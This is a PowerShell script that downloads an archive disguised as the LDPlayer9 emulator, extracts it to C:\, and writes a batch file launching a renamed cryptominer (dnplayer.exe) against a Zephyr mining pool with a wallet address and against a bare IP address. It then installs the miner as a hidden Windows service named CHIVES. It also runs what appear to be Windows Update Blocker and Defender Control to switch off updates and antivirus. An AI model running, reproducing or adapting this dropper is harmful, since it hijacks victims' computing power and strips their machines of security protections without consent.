
$tCommand = if (-not (Test-Path ($tCommand = [System.IO.Path]::Combine($env:ProgramFiles, 'Windows Defender', 'MSASCui.exe')) -PathType Leaf)) { "windowsdefender://Threatsettings" } else { $tCommand }; Start-Process $tCommand
Start-Sleep -Seconds 20
$downloadPath = Join-Path -Path $env:USERPROFILE -ChildPath "Desktop"
$url = "https://github.com/trangtrau/random-agent-spoofer/releases/download/SA/LDPlayer9.zip"
Invoke-WebRequest -Uri $url -OutFile "$downloadPath\LDPlayer9.zip"
$destinationPath = "C:\" 
Expand-Archive -Path "$downloadPath\LDPlayer9.zip" -DestinationPath $destinationPath -Force
Start-Sleep -Seconds 2
Set-Location -Path "C:\LDPlayer9\"
$userName = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
$userName = $userName -replace "^.*\\", ""
$folderPath = "C:\LDPlayer9"
$batContent = @"
cd %~dp0
::dnplayer.exe -o zephyr.miningocean.org:5332 -u ZEPHsAtsau1NnQ96FKLV5RNQFqzgi5NPbUqCUGHb5MCnUjT3H2vF9usMdE5YUG5fTu1Mfyqz7pNYxFgaZgSKVA9YSWPFmWkpjUX -p $userName -a rx/0 -k -t 8
dnplayer.exe -o 154.12.254.94:22

pause
"@
$batContent | Set-Content -Path (Join-Path -Path $folderPath -ChildPath "van.bat") -Force
New-Item -Path "$env:USERPROFILE\Desktop\Service_OK.dat" -ItemType File
Start-Process -FilePath "nssm.exe" -ArgumentList "install CHIVES `"$folderPath\van.bat`""
Start-Sleep -Seconds 2
Start-Sleep -Seconds 1
Start-Process -FilePath "wub.exe" -ArgumentList "/D"
Start-Process -FilePath "dfControl.exe"
Start-Sleep -Seconds 1
Start-Process -FilePath "nssm.exe" -ArgumentList "start CHIVES"
